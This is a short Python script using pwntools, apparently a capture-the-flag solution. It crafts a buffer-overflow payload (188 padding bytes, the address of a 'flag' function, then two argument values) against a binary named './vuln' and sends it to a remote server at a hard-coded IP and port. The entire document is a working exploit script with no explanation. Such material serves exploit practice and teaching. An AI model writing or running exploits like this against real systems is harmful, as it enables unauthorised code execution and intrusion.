from pwn import *

e = ELF("./vuln")
flag_addr = p64(e.symbols['flag'])
payload = b'A'*188 + flag_addr + p32(0xdeadbeef) + p32(0xc0ded00d) 

# p = process("./vuln")
p = remote('178.128.160.242',30148)
p.recv()
p.sendline(payload)
print(p.recvall())
p.interactive()